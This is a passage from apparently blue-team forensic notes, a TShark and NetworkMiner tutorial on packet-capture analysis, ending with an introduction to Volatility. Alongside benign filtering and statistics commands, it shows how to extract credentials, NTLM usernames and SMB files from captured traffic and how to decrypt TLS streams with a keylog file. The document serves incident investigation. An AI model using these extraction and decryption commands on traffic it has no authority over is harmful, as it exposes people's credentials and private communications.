        - [Hunting Decrypted Hosts](#Hunting-Decrypted-Hosts)
        - [Get a decrypted stream number](#Get-a-decrypted-stream-number)
        - [Following decrypted stream](#Following-decrypted-stream)
    - [SMB](#smb)
      - [SMB File Interaction](#smb-file-interaction)
      - [SMB Users](#smb-users)
    - [TCP](#tcp)
      - [Attribute Listening-ports](#attribute-listening-ports)
      - [What Commands did an Adversary Run](#what-commands-did-an-adversary-run)
    - [Get Credentials](#get-credentials)
  
</details>

TShark is the terminal implementation of Wireshark. Both Tshark and Wireshark can read captured network traffic (PCAPs).

There are resource advantages to using TShark, as you are keeping everything command line and can pre-filter before you even ingest and read a file. A meaty pcap will take a while to be ingested by Wireshark on the other hand. But once ingested, Wireshark proves to be the better option. If you're in a hurry, TShark will give you the answers you need at break-neck speed!

Johannes Weber has an awesome [blog with case studies](https://weberblog.net/pcaps-n-wireshark/) on advanced pcacp analysis

---
# Add
#### Add Colour

An essential part of making TShark _aesthetically_ pop. Adding colour makes an analysts life easier. 

However the `--color` flag doesn't stack well with other flags, so be careful. 

```bash
tshark --color -r c42-MTA6.pcap

## stacks well with these flags
tshark -t ud -r c42-MTA6.pcap -x -P --color
```
![2021-06-18_17-40](https://user-images.githubusercontent.com/44196051/122593574-c45e9180-d05d-11eb-8d93-f03d3f67ee09.png)

---

#### Add Time

By default, packets' time will show the time lasped between packets. This may not be the most useful method if you're trying to quickly correleate time

```bash
#Get the UTC.Preferable in security, where we always try to keep security tooling at UTC time, for consitency across tools
tshark -r c42-MTA6.pcap -t ud

#Get the local year, month, date, and time the packet was captured
tshark -r c42-MTA6.pcap -t ad
```

![image](https://user-images.githubusercontent.com/44196051/122607616-c41cc100-d072-11eb-9cc1-884454f3bf68.png)

#### Add Space

Default Tshark squishes the packet headers with no gaps. You can have the packet headers print with gaps in between - which makes reading all that bit easier, using `| pr -Ttd`

```bash
tshark -r dns.pcapng | pr -Ttd
```
In the screenshot, you can see how spacious and luxurious the top results are, and how dirty and unreadable the second half is!

![image](https://user-images.githubusercontent.com/44196051/123539120-08255b00-d730-11eb-8ad1-b426bcb20922.png)

#### Add Readable Detail

What's a packet without the decoded text! Use the `-x` flag to get some insight into what's occuring

```bash
tshark -r Voip-trace.pcap -x
```
![image](https://user-images.githubusercontent.com/44196051/122620121-06053180-d08a-11eb-9058-7c466642a571.png)

Also, you can add verbose mode which includes all of Wireshark's drop-down details that you'd normally get. This can yield a whole lot of data, so best to try and filter this bad boy

```bash
#just verbose
tshark -r Voip-trace.pcap -V

#filtered a bit to focus on sip protocol only
tshark -r Voip-trace.pcap -V -x -Y sip
```
![image](https://user-images.githubusercontent.com/44196051/122620266-68f6c880-d08a-11eb-85dc-f414e28e154d.png)


You'll also probably want to print the packet line too, with `-P`

```bash
tshark -r c42-MTA6.pcap -V -x -Y dns -P

```
![image](https://user-images.githubusercontent.com/44196051/122622067-6e0a4680-d08f-11eb-820d-0a82847ec904.png)

#### Get Specific Packet

Say a particular packet header captures your eye. You want to get as much info as possible on that specific packet.

Take note of it's packet number.

![image](https://user-images.githubusercontent.com/44196051/123178706-ad65d800-d47f-11eb-8d26-2d45531544e4.png)

Then, insert it's packet number under `-c`
```bash
tshark -r packet.pcapng -x -V -P -c 27300| tail -n 120
#-c means show up to this number
#the -n 120 in tail can be changed to whatever you length you need
```
Now we get the full packet details for the specific packet that we wanted.

![image](https://user-images.githubusercontent.com/44196051/123178949-3977ff80-d480-11eb-8b7b-9ab95032f0bc.png)


#### Ideal base for any TShark command

We can stack lots and lots of things in TShark, but there are some ideal flags that we've already mentioned (or not yet mentioned) that form a solid base. Adding these flags in, or variations of them, will usually always ensure we don't get too lost. 

```bash
#read the pcacp, print time in UTC, verbose details, hex/ascii, print packet summary line, AND filter by a protocol (in this case DNS)
tshark -r c42-MTA6.pcap -t ud -V -x -P -Y dns

##print all the packets and the hex/ASCII, with color
tshark -t ud -r c42-MTA6.pcap -x -P --color
```
---

### Change Format of Packet

For reasons various, you may not be satisfied with how a packet is printed by default. 

#### Get Format Options
To find out the options you have and the descriptions behind them, run this bad boy:

```bash
#the help will fail to do anything but don't worry about that
tshark -T help
```
![image](https://user-images.githubusercontent.com/44196051/122594520-05a37100-d05f-11eb-9292-e96863f185c8.png)


##### Prepare for Elastic

Say for example we want to upload a packet into an ELK stack, we can print the PCAP in Elastic format.
```bash
#print it to terminal in Elastic format
  # -P means packet summary
  # -V means packet details
tshark -T ek -P -V -r c42-MTA6.pcap

#you can always filter by protocls with -j
tshark -T ek -j "http tcp ip" -P -V -r c42-MTA6.pcap

#output it to elastic format and save in a file, to be ingested by an ELK later
tshark -T ek -P -V -r c42-MTA6.pcap > elastic.json
```

Notice how Elastic wraps things around `{}`, the curly brackets.

![image](https://user-images.githubusercontent.com/44196051/122594999-ad20a380-d05f-11eb-94d5-72c19044bfca.png)

Moreover, Elastic needs a *mapping index* as a template to convert this packet business into somthing ELK can understand. 

```bash
#this is a BIG output
tshark -G elastic-mapping > map.index
#You can filter by protocol
tshark -G elastic-mapping --elastic-mapping-filter ip,smb,dns,tcp  > map.index
```
![image](https://user-images.githubusercontent.com/44196051/122596008-2a98e380-d061-11eb-9af4-16a3a9c75801.png)

![image](https://user-images.githubusercontent.com/44196051/122596228-75b2f680-d061-11eb-81aa-9bdf6beed4dc.png)


##### Tabs

You know how in Wireshark you can open up the drop-down tabs to filter and get more info?

![image](https://user-images.githubusercontent.com/44196051/122599438-481c7c00-d066-11eb-9eda-f9f7fb23751f.png)

You can do that in TShark too. Though it just prints ALL of the tabs
```bash
tshark -T tabs -V -r c42-MTA6.pcap

#can do more or less the same just flagging -V from normal
tshark -V -r c42-MTA6.pcap
```
![image](https://user-images.githubusercontent.com/44196051/122599551-77cb8400-d066-11eb-929a-38dc7f2d0f64.png)


##### Other Formats

You can always do JSON 

```bash
tshark -T json -r c42-MTA6.pcap
```
![image](https://user-images.githubusercontent.com/44196051/122597042-b8c19980-d062-11eb-8702-b8369334b2dd.png)

Packet Details Markup Language (PDML) is an XML-style represenation

```bash
tshark -T pdml -r c42-MTA6.pcap
```
![image](https://user-images.githubusercontent.com/44196051/122597477-51581980-d063-11eb-9098-8adb8d604805.png)

PostScript (PS) is an interesting one. I don't particularly know the purpose of it to be honest with you. All I know is it can eventually create a cool looking pdf.

```bash
# create a ps
tshark -T ps -r c42-MTA6.pcap > test.ps

## you can be verbose. This will make a CHUNGUS file though, very unwiedly
tshark -T ps -V -r c42-MTA6.pcap > verbose.ps

#You can convert it online in various places and turn it into a PDF
```

Raw PS

![image](https://user-images.githubusercontent.com/44196051/122598814-3e464900-d065-11eb-9334-717a2dee3888.png)


Size difference between -verbose flag on and off

![image](https://user-images.githubusercontent.com/44196051/122598662-09d28d00-d065-11eb-83e8-b3e242bcab00.png)

Converted to PDF

![image](https://user-images.githubusercontent.com/44196051/122598850-4f8f5580-d065-11eb-8757-c8329a507bfb.png)

---

### Filtering

#### Glossary

`-G` is a GREAT flag. Using `tshark -G help` you can get an overview for everything the Glossary can show you

![image](https://user-images.githubusercontent.com/44196051/122604193-75b8f380-d06d-11eb-9b0b-6aa4e5236f9a.png)

##### Protocols
```bash
tshark -G protocols

#If you know the family of protocol you already want, grep for it
tshark -G protocols | grep -i smb
```

![image](https://user-images.githubusercontent.com/44196051/122604416-d6483080-d06d-11eb-9454-4c710bd8aa90.png)


#### By Protocol

Filter the protocols you want under the -Y flag
```bash
#get just the one
tshark -r c42-MTA6.pcap -Y "dhcp"
tshark -r c42-MTA6.pcap -V -Y "dhcp" #will be vebose and add way more info

#Or treat yourself and collect more than one
tshark -r c42-MTA6.pcap -Y "dhcp or http"
tshark -r c42-MTA6.pcap -V -Y "dhcp or http" #will be vebose and add way more info
```
![image](https://user-images.githubusercontent.com/44196051/122602566-f62a2500-d06a-11eb-8eb5-4419774cd3f3.png)


If you want to only show detail for particuar protocols, but not filter OUT existing protocols and packets, then the `-O` is your man
```bash
tshark -r c42-MTA6.pcap -O http

#You can have more than one by comma seperation
tshark -r c42-MTA6.pcap -O http,ip

```
![image](https://user-images.githubusercontent.com/44196051/122605195-08a65d80-d06f-11eb-8c20-30d194754cc1.png)


#### By IPs

You can can hunt down what a particular IP is up to in your packet

```bash
tshark -r c42-MTA6.pcap -Y "ip.addr==192.168.137.56" 

#For style points, pipe to ack so it will highlight when your IP appears!
| ack '192.168.137.56'
```

![image](https://user-images.githubusercontent.com/44196051/122602816-57ea8f00-d06b-11eb-9653-10c98a4f3630.png)

If you want to get a list of all the IPs involved in this traffic, get by Host IP and Destination IP

```bash
# you can use the -z flag, and we'll get onto that in more detail later
tshark -r c42-MTA6.pcap -q -z ip_hosts,tree
tshark -r c42-MTA6.pcap -q -z ip_srcdst,tree
```
![image](https://user-images.githubusercontent.com/44196051/122603021-a566fc00-d06b-11eb-9156-d3a664ade21a.png)

Alternatively, just do a dirty grep regex to list out all the IPs
```bash
tshark -r c42-MTA6.pcap |
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | 
sort -u
```
![image](https://user-images.githubusercontent.com/44196051/122603441-3a69f500-d06c-11eb-8068-93b4a02c6f86.png)

#### Using DisplayFilters

DisplayFilters are grep-like methods to control exactly what packets are shown to you. You can use filters by themselves, or stack them. I regularly use [DisplayFilter cheat sheets](https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf) as a reminder of all the filtering options avaliable. 


The trick to getting specific answers in TShark is to use DisplayFilters at the right time. You won't really use them for granularity at the beginning of an investigation. You may `-Y [protocol]` from the beginning, but to use DisplayFilters you need to have particular values that you are hunting for more information on. This inevitably comes as the investigation progresses. 

Perhaps you want to see what kind of HTTP codes have appeared
```bash
tshark -r packet.pcapng -t ud -Y 'http.response.code'
```
Once you see a particular code (say 200), you can filter down for more info

```bash
tshark -r packet.pcapng -t ud -Y 'http.response.code==200'

#to punish yourself, you can make it verbose now you've filtered it down
tshark -r packet.pcapng -t ud -Y 'http.response.code==200' -x -V -P
```

![image](https://user-images.githubusercontent.com/44196051/123527934-87d50a80-d6db-11eb-9685-cad808ae2026.png)

You may have seen a particular IP, and you want to know what TLS activity it's had

```bash
tshark -r packet.pcapng 'tls and ip.addr==159.65.89.65' 
```
![image](https://user-images.githubusercontent.com/44196051/123527803-6d4e6180-d6da-11eb-94b9-8243f7b95067.png)

Or maybe you have a particularly MAC address, and you want to know FTP instances

```bash
tshark -r packet.pcapng 'ftp and eth.addr==c8:09:a8:57:47:93'
```
![image](https://user-images.githubusercontent.com/44196051/123527831-adaddf80-d6da-11eb-8ac9-de133f15b0d7.png)

Maybe you're interested to see what DNS activity a particular IP address had

```bash
tshark -r packet.pcapng 'dns and ip.addr==192.168.1.26'
```
![image](https://user-images.githubusercontent.com/44196051/123528324-1a76a900-d6de-11eb-8530-a75a32c34b06.png)


You can find another example here for a [different instance](#Filter-Between-Two-IPs)

##### Removing info around DisplayFilters

Sometimes, you'll be using DisplayFilters that are difficult. Take example, VLAN querying for STP. Specifically, we want to see how many topology changes there are.

The DisplayFilter for this is `stp.flags.tc==1`. But putting that in doesn't seem to work for me.....so I know the value I want to see. I COULD grep, but that would end up being difficult

Instead, I can utilise the `-T fields` flag, which allows me to use the `-e` flag that will only print particular filters. In our case, all I want to do is find the packet number that gives the first 'yes' for topology (which will =1). 

```bash
tshark -r network.pcapng -T fields -e frame.number -e stp.flags.tc | 
sort -k2 -u
# -k flag says sort on a particular column. 
# We don't want to sort on the packet numbers, we want to sort on the boolen values of 1 and 0
```
Awesome, here we can see that packet 42 is the first time there is confirmation that the topology has changed. We have stripped back the information to only show us exactly what we want: packet number, and STP topography boolean
![image](https://user-images.githubusercontent.com/44196051/123549469-1b045380-d761-11eb-90f6-917c170346d5.png)

Now we know the packet number, let's go investgate more details on the VLAN number responsible
```bash
tshark -r network.pcapng -V -P -c 42  | 
tail -n120 | 
ack -i 'topology' --passthru
```
![image](https://user-images.githubusercontent.com/44196051/123549714-0ffdf300-d762-11eb-9845-f364b2b37b1c.png)

Awesome, so we managed to achieve all of this by first sifting out all noise and focusing just on the two fields of the display filter


---

### Stats

The `-z` flag is weird. It's super useful to collect and aggregate stats about particular values. Want to know all of the IPs in captured traffic AND sort them according to how prevelant they are in traffic? `-z` is your guy

Get a list of all the things it can provide 
```bash
tshark -z help
```
![image](https://user-images.githubusercontent.com/44196051/122608278-d3e8d500-d073-11eb-90ca-e239b067f056.png)

#### Get Conversations
The `-z` flag can collect all the conversations that particular protocols are having. At the bottom, it will provide a table of stats

There are the services supported 

![image](https://user-images.githubusercontent.com/44196051/122608683-8f116e00-d074-11eb-9a76-af2d301b241b.png)
![image](https://user-images.githubusercontent.com/44196051/122608725-a2bcd480-d074-11eb-8536-5aa5552be689.png)

Some examples include:

##### IP conversations.
```bash
tshark -r c42-MTA6.pcap -q -z conv,ip
# the -q flag suppresses packets and just gives the STATS

#endpoints involved in traffic
tshark -r c42-MTA6.pcap -q -z endpoints,ipv4
```
![image](https://user-images.githubusercontent.com/44196051/122608548-4fe31d00-d074-11eb-9422-ea7ac45dd68e.png)
![image](https://user-images.githubusercontent.com/44196051/122611182-cc77fa80-d078-11eb-9ad2-fbbe5188be7d.png)

##### DNS Conversations
```bash
tshark -r c42-MTA6.pcap -q -z dns,tree
```
![image](https://user-images.githubusercontent.com/44196051/122610819-2c21d600-d078-11eb-98fe-f5b80606d981.png)

##### DHCP conversations
```bash
tshark -r c42-MTA6.pcap -q -z dhcp,stat
```
![image](https://user-images.githubusercontent.com/44196051/122610951-668b7300-d078-11eb-993d-145108c4421b.png)

###### DHCP Details

You can rip out some interesting details from DHCP packets. For example, the requested IP address from the client, and the host name involved
```
tshark -r network.pcapng -Y dhcp -V | ack 'Requested IP Address|Host Name' --nocolor
```
![image](https://user-images.githubusercontent.com/44196051/123548806-3752c100-d75e-11eb-9dad-51a1818cf595.png)


##### SIP Conversations
```bash
tshark -r Voip-trace.pcap -q -z sip,stat 
```
![image](https://user-images.githubusercontent.com/44196051/122618625-832ea780-d086-11eb-8fe4-5f39d7502afa.png)


##### Stats on Protocols Involved in Traffic

This will display a heiarchy of the protocols involved in collected traffic

```bash
tshark -r c42-MTA6.pcap -q -z io,phs
```
![image](https://user-images.githubusercontent.com/44196051/122612981-f979dc80-d07b-11eb-8c1f-c363103a2161.png)

##### Filter Between Two IPs

Let's say we want to know when a local machine (192.168.1.26) communicated out to an external public IP (24.39.217.246) on UDP 

There are loads of ways to do this, but I'll offer two for now.

You can eyeball it. 
The advantadge of this method is that it shows the details of the communication on the right-hand size, in stats form (bytes transferred for example). But isn't helpful as you need to focus on every time the colours are on the same row, which is evidence that the two IPs are in communication. So it isn't actually clear how many times these two IPs communicated on UDP

```bash
tshark -r packet.pcapng -q -z conv,udp |ack '192.168.1.26|24.39.217.246
```
![image](https://user-images.githubusercontent.com/44196051/123527443-8d305600-d6d7-11eb-879c-d90c2d7cb7e1.png)


An alternate method is to filter by protocol and ip.addr. 
This is much more sophsticated method, as it allows greater granularity and offers flags to include UTC time. However, the tradeoff compared to the above version is that you don't get stats on the communication, like bytes communicated. You can add verbose flags, however these still don't get stats. 

```bash
tshark -r packet.pcapng -t ud 'udp and ip.addr==192.168.1.26 and ip.addr==24.39.217.246'
# | wc -l will let you know the number of commmunications
```
![image](https://user-images.githubusercontent.com/44196051/123527524-5c045580-d6d8-11eb-9516-58d812e9fe3c.png)


#### HTTP
We can collect a whole wealth of info on http stats with the `-z` flag

The various HTTP codes and requests in a hierarchy

```bash
tshark -r c42-MTA6.pcap -q -z http,tree
#change to http2,tree if necessary
```
![image](https://user-images.githubusercontent.com/44196051/122613334-950b4d00-d07c-11eb-9c95-b28f70b44625.png)


Part of `-z expert` will collect all the GET and POST requests. Just scroll down to *Chats*
```bash
tshark -r c42-MTA6.pcap -q -z expert
```
![image](https://user-images.githubusercontent.com/44196051/122613985-ae60c900-d07d-11eb-8794-924f8041e218.png)


##### Resolve Hosts

Collect IPs and the hostname they resolved to at the time

```bash
tshark -r c42-MTA6.pcap -q -z hosts
```
![image](https://user-images.githubusercontent.com/44196051/122611483-4dcf8d00-d079-11eb-843d-78e565630f89.png)

##### Find User Agents
```bash
tshark -r Voip-trace.pcap -Y http.request -T fields -e http.host -e http.user_agent | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/122619105-92fabb80-d087-11eb-9742-56cac00b6a37.png)

#### Get MAC Addresses
It can be useful to know what MAC addresses have been involved in a conversation

```bash
#I picked FTP as a protocol to filter by, you don't have to. You could remove the -Y flag
tshark -r packet.pcapng -Y ftp -x -V -P | grep Ethernet | sort -u
```
![image](https://user-images.githubusercontent.com/44196051/123527243-b64fe700-d6d5-11eb-87db-3735d8c737b2.png)

#### Decrypt TLS traffic

To decrypt network https traffic, you need a decryption key. I'll go over how to get those another time. For now, we'll assume we have one called _tls_decrypt_key.txt_. 

This is another instance where, to be honest, Wireshark is just straight up easier to use. But for now, I'll show you TShark. We use decryption keys like so: `-o tls.keylog_file: key.txt`

##### Sanity Check the Key is working

First, we need to sanity check that we actually have a working decryption key. Nice and simple, let's get some stats about the traffic:

```bash
tshark -r https.pcapng -q -z io,phs,tls
#re=run and pipe to get line numbers
!! | wc -l
```
Nice and simple, there's not much going on here. Only 12 or so lines of info

![image](https://user-images.githubusercontent.com/44196051/123551570-4b9cbb00-d76a-11eb-824a-688149342266.png)

Well, now let's compare what kind of data we get when we insert our decryption key. 
```bash
tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt  -q -z io,phs,tls
#re=run and pipe to get line numbers
!! | wc -l
```
![image](https://user-images.githubusercontent.com/44196051/123551674-ba7a1400-d76a-11eb-8aec-f6ecf5fff437.png)

That's quite a lot more information....61 lines now, significantly more than 12. Which suggests our decryption efforts worked.

![image](https://user-images.githubusercontent.com/44196051/123551699-cc5bb700-d76a-11eb-983b-4f130da87f6c.png)

##### Hunting Decrypted Hosts

Now that we've done that, let's go and hunt for some decrypted traffic to look at. We'll start by ripping out all of the website names
```bash
tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt \
-T fields -e frame.number -e http.host| 
sort -k2 -u
#there's a lot going on here, so just a reminder
  # -r means read the given packets
  # -o is the decrypion key
  # -T is where we are changing print format to utilise fields
  # -e is where we are filtering to only print the website name and it's corresponding packet number
  # sort's -k2 flag picks the second column to filter on and ignores sorting on the first column
  # sort -u flag removes duplicate website names
```
In the top half of the screenshot, you can see the results we WOULD have got if we hunted without a decryption key. On the bottom half of the screenshot, you can see we get a lot more information now we can decrypt the traffic.

![image](https://user-images.githubusercontent.com/44196051/123551995-15603b00-d76c-11eb-819f-a51dde4d4a1d.png)

##### Get a decrypted stream number

Let's say we've seen a suspicious website (we'll choose web01.fruitinc.xyz), identify it's corresponding packet number (675) and let's go and hunt for a stream number
```bash
tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -c675 -V -P | 
tail -n120 | ack -i --passthru 'stream index'
```

![image](https://user-images.githubusercontent.com/44196051/123552167-cc5cb680-d76c-11eb-84e8-d4e64e29a8fa.png)

Not bad, we've identified the stream conversation is 27. Now let's go and follow it

##### Following decrypted stream

Let's check on the decrypted TLS interactions first
```bash
tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -q \
-z follow,tls,ascii,27
#follow is essentially follow stream
#tls is the protocol we specify
#ascii is the printed format we want
#27 is the Stream Index we want to follow
```
And here we get the decrypted TLS communication. 

![image](https://user-images.githubusercontent.com/44196051/123552273-5442c080-d76d-11eb-9aed-d4a3cd521aa5.png)

This screenshot shows what happens if we run the same without the decryption key
![image](https://user-images.githubusercontent.com/44196051/123552339-953ad500-d76d-11eb-9c4a-1b5a5ecf14bf.png)

You get much of the same result if we check on HTTP interactions next

![image](https://user-images.githubusercontent.com/44196051/123552404-e8148c80-d76d-11eb-903a-a66c0a030215.png)

### SMB
Be sure you're using DisplayFilters specific to [SMB1](https://www.wireshark.org/docs/dfref/s/smb.html) and [SMB2](https://www.wireshark.org/docs/dfref/s/smb2.html)

#### SMB File Interaction

One of the quickest ways I know to get contexual info on what SMB files were interacted with is `smb.fid`

```bash
tshark -r smb.pcapng -Y smb2.fid 
```
![image](https://user-images.githubusercontent.com/44196051/123540185-ad8efd80-d735-11eb-9ba8-eea6711a5b6f.png)

#### SMB Users

You can quickly grab usernames/accounts with this command
```bash
tshark -r smb.pcapng -Tfields -e smb2.acct | sed '/^$/d'
```
I would then grep out for that username, for more info
```bash
tshark -r smb.pcapng | grep -i 'jtomato'
```

Or fuck it, just grep for user and let the dice fall where the fates' deign.
```bash
tshark -r smb.pcapng | grep -i 'user'
```

![image](https://user-images.githubusercontent.com/44196051/123540481-1f1b7b80-d737-11eb-9b2b-a9e95551828c.png)

For general windows users, you can utlise NTLM filters
```bash
tshark -r smb.pcapng -Y 'ntlmssp.auth.username'
```

![image](https://user-images.githubusercontent.com/44196051/123540673-1c6d5600-d738-11eb-8eb0-bd2882335ec9.png)

### TCP
#### Attribute Listening Ports
Say you've captured traffic that may have had a reverse shell established.

We can quickly find out the TCP ports and respective IPs that were involved in the communication. Though keep in mind reverse shells can also use UDP ports, and C2 can happen over some wacky stuff like DNS and ICMP (which is ping's protocol). 

Here, we get awesome results that let us know 192.168.2.244 was using 4444, which is Metasploit's default port to use

```bash
tshark -r shell.pcapng -q -z endpoints,tcp
```
![image](https://user-images.githubusercontent.com/44196051/123541609-4d03be80-d73d-11eb-89f4-6aca9ba68cac.png)

A limitation of the above command however is that it is doesn't give information on WHOMST the malicious port and IP were communicating with. Therefore, we can also deploy this command, which let's us know source and destination IP's relationship, as well as the number of packets communicated in this relationship, and the time duration of this relationship.

```bash
tshark -r shell.pcapng -q -z conv,tcp
```
![image](https://user-images.githubusercontent.com/44196051/123541706-b84d9080-d73d-11eb-9bbb-f82c9ee32e00.png)

#### What Commands did an Adversary Run
Honestly, this is one of those things that is easier done in _Wireshark_. Going to Analyse, Follow, and TCP Stream will reveal much.

![image](https://user-images.githubusercontent.com/44196051/123542287-c18c2c80-d740-11eb-94fd-14d1ece98746.png)

If you absolutely want to do this in the command-line, Tshark will allow this. Under `-z` we can see `follow,X`. Any protocol  under here can be forced to show the stream of conversation.

![image](https://user-images.githubusercontent.com/44196051/123542319-fbf5c980-d740-11eb-806f-d6136dfece51.png)


We can compare what our command-line tshark implementation and our wireshark implementation look like. Though it ain't as pretty, you can see they both deliver the same amount of information. The advantadge of Tshark of course is that it does not need to ingest a packet to analyse it, whereas Wireshark does which can come at an initial performance cost.

```bash
tshark -r shell.pcapng -q -z follow,tcp,ascii,0
```

![image](https://user-images.githubusercontent.com/44196051/123542412-69a1f580-d741-11eb-8e0e-5865116799af.png)


For other packets, to identify their stream conversation it saves the value as "Stream Index: X"
![image](https://user-images.githubusercontent.com/44196051/123550706-bcda6f00-d766-11eb-80cd-6e0e5f71be8f.png)

#### Get Credentials
In theory, `-z credentials` will collect the credentials in packets. I, however, have not had much success with this tbh. 

```bash
tshark -r ftp.pcap -z credentials
```
![image](https://user-images.githubusercontent.com/44196051/122676704-14ad2f00-d1d7-11eb-9007-c7b175a92dd2.png)


Here's an alternative, less refined, works though.
```bash
tshark -r 0.pcap -V -x -P | grep -iE 'user|pass'
```
![image](https://user-images.githubusercontent.com/44196051/122676730-2bec1c80-d1d7-11eb-8403-bd307217638b.png)



---

## Extracting Stuff

Wireshark sometimes sucks when you want to quickly extract stuff and just look at it. Fortunately, there are alternatives to be able to quickly get and look at files, images, credentials, and more in packets.

<details>
    <summary>section contents</summary>

  + [NetworkMiner](#networkminer)
    - [View Files](#view-files)
    - [View Images](#view-images)
    - [View Creds](#view-creds)
  + [Tshark Export Objects](#tshark-export-objects)
    - [Export SMB files](#export-smb-files)
    - [Export HTTP files with Decryption Key](#export-http-files-with-decryption-key)
  
  </details>

### NetworkMiner

NetworkMiner is GUI-based network traffic analysis tool. It can do lots of things, but the main things we can focus on here is the ability to rapidly look at all the _stuff_.

BUT, NetworkMiner has some limitations in its FREE version, so we'll just focus on some of its features. 

You can fire up NetworkMiner from command-line to ingest a particular pcap
```bash
networkminer c42-MTA6.pcap 
```
![image](https://user-images.githubusercontent.com/44196051/122639057-a3df1780-d0ef-11eb-9c8c-f8a638041730.png)

### View Files
In the top bar, you can filter for all of the files in the traffic.

![image](https://user-images.githubusercontent.com/44196051/122639240-b7d74900-d0f0-11eb-9d63-d4d1fa0cb537.png)


### View Images
In the top bar, you can filter for all of the images in the traffic. It will include any images rendered on websites, so you'll get a load of random crap too. 

![image](https://user-images.githubusercontent.com/44196051/122639126-fae4ec80-d0ef-11eb-917e-65844a086a2a.png)

Once you see a file you find interesting, right-click and view the file
![image](https://user-images.githubusercontent.com/44196051/122639309-04bb1f80-d0f1-11eb-83d6-b01107482f99.png)

### View Creds

Honestly, I find that these credential filters always suck. Maybe you'll have better luck 
![image](https://user-images.githubusercontent.com/44196051/122639517-2e287b00-d0f2-11eb-9b31-259b6fed6ed8.png)


## Tshark Export Objects
For all of the protocols and detailed guidance on exporting objects, you can see [TShark docs on the matter](https://tshark.dev/export/export_regular/)

![image](https://user-images.githubusercontent.com/44196051/123541036-1c6e5580-d73a-11eb-9813-f73412467493.png)

### Export SMB Files
Let's say through our packet analysis, we've identified a particular SMB file we find interesting called _TradeSecrets.txt_

![image](https://user-images.githubusercontent.com/44196051/123541050-314ae900-d73a-11eb-93c9-2466b333ce3a.png)

We can go and get all of the SMB files, and save it locally in a directory called smb_exported_files
```bash
tshark -r smb.pcapng -q --export-object smb,smb_exported_files
#-q means don't print all of the packet headers. We don't need those flying across the screen
#the way we export things is by protocol and then local destination directory: so --export-object `smb,local_dir`
```

![image](https://user-images.githubusercontent.com/44196051/123541137-c948d280-d73a-11eb-8be7-6f5fa636f857.png)

We get the original file, as if we ourselves downloaded it. However, unfortunately we do not get the original metadata so the date and time of the file reflects our current, local time and date. But nonetheless, we have the file!

![image](https://user-images.githubusercontent.com/44196051/123541225-47a57480-d73b-11eb-8b85-4ed5911bfc75.png)

### Export HTTP Files with Decryption Key

In some situations, you will have a TLS decryption key in your hands. There may have been a file in the traffic you want to get your hands on, so let's do it!

Let's say we're looking around the decrypted traffic and we see an interesting file referenced, in this case an image:

![image](https://user-images.githubusercontent.com/44196051/123552848-15fad080-d770-11eb-89bf-6f14870baad5.png)

To retrieve this image, we need only supply the decryption key whilst we export the object
```bash
tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -q \
--export-objects http,exported_http_files
```
And we have downloaded the image to our export directory. Awesome 
![image](https://user-images.githubusercontent.com/44196051/123552986-c8329800-d770-11eb-9e7b-9b9682d76859.png)

## PCAP Analysis IRL

I've dissected real life situations via network analysis techniques

You can find my ~~corporate shill~~ professional content [here](https://github.com/Purp1eW0lf/PrintNightmare/blob/main/PrintNightmarePCAPAnalysis.md)

# Digital Forensics

If you're interested in digital forensics, there are some immediate authoritive sources I implore you to look at:
* [13cubed's youtube content](https://www.13cubed.com) - Richard Davis is a DFIR legend and has some great learning resources
* [Eric Zimmeraman's toolkit](https://ericzimmerman.github.io/#!index.md) - Eric is the author of some incredibly tools, and it's worth checking out his documentation on exactly how and when to use them. 

<details>
   <summary>section contents</summary>

  + [volatility](#volatility)
  + [Quick Forensics](#quick-forensics)
  + [Chainsaw](#chainsaw)
  + [Browser History](#browser-history)
  + [Which logs to pull in an incident](#Which-logs-to-pull-in-an-incident)
  + [USBs](#USBs)

  </details>

## volatility
<details>
    <summary>section contents</summary>

  + [Get Started](#get-started)
    - [Reviewing Options](#reviewing-options)
  + [Get Basics](#get-basics)
    - [Get Profile](#get-profile)
      - [Vol2](#vol2)
    - [Get Files](#get-files)
      - [Resurrect Files](#Resurrect-Files)
  + [Get Sus Activity](#get-sus-activity)
    - [Get Commands](#get-commands)
    - [Get Network Connections](#get-network-connections)
    - [Get Processes](#get-processes)
  
  </details>

There are loads of tools that can assist you with forensically exmaining stuff. Volatility is awesome and can aid you on your journey. Be warned though, digital forensics in general are resource-hungry and running it on a VM without adequate storage and resource allocated will lead to a bad time. 

In the Blue Team Notes, we'll use vol.py and vol3 (python2 and python3 implementation's of Volatility, respectively). In my un-educated, un-wise opinon, vol2 does SOME things better than vol3 - for example, Vol2 has plugins around browser history. 

Because Volatility can take a while to run things, the general advice is to always run commands and output them (`> file.txt`). This way, you do not need to sit and wait for a command to run to re-check something.


### Get Started
It's worth reviewing trhe Volatility docs, and make sure you've organised yourself as best as possible before getting started.

One important prep task is to download the [symbols table](https://github.com/volatilityfoundation/volatility3#symbol-tables) into your local machine

![image](https://user-images.githubusercontent.com/44196051/122973314-030b8900-d389-11eb-8cda-fbca5f041b09.png)

#### Reviewing options

Reading the [docs](https://volatility3.readthedocs.io/en/latest/) and the `-h` help option let you know exactly what options you have available

Python2: `Vol.py -h`

![image](https://user-images.githubusercontent.com/44196051/122974946-c2ad0a80-d38a-11eb-9773-4aaaefd3e583.png)

Python3: `vol3 -h`

When you see a plugin you like the look of, you can `-h` on it to get more options

```bash
#let's take the plugin windows.memmap.Memmap, for example
vol3 windows.memmap.Memmap -h
```
![image](https://user-images.githubusercontent.com/44196051/122976503-5501de00-d38c-11eb-9eb0-83d64b49bdc1.png)

Volatility has options for Linux, Mac, and Windows. The notes here mainly focus on Windows plugins, but the other OS' plugins are great fun too so give them a go sometime. 

### Get Basics

Get basic info about the dumped image itself

Find when the file was created
```bash
stat dumped_image.mem

#exiftool can achieve similar
exiftool dumped_image.mem
```

![image](https://user-images.githubusercontent.com/44196051/122972597-3994d400-d388-11eb-95fb-5f008132b359.png)

#### Get Profile

Get some basic info about the OS version of the dump 
```bash
vol3 -f dumped_image.mem windows.info.Info
```
![image](https://user-images.githubusercontent.com/44196051/122976239-12d89c80-d38c-11eb-8666-eda08346042d.png)

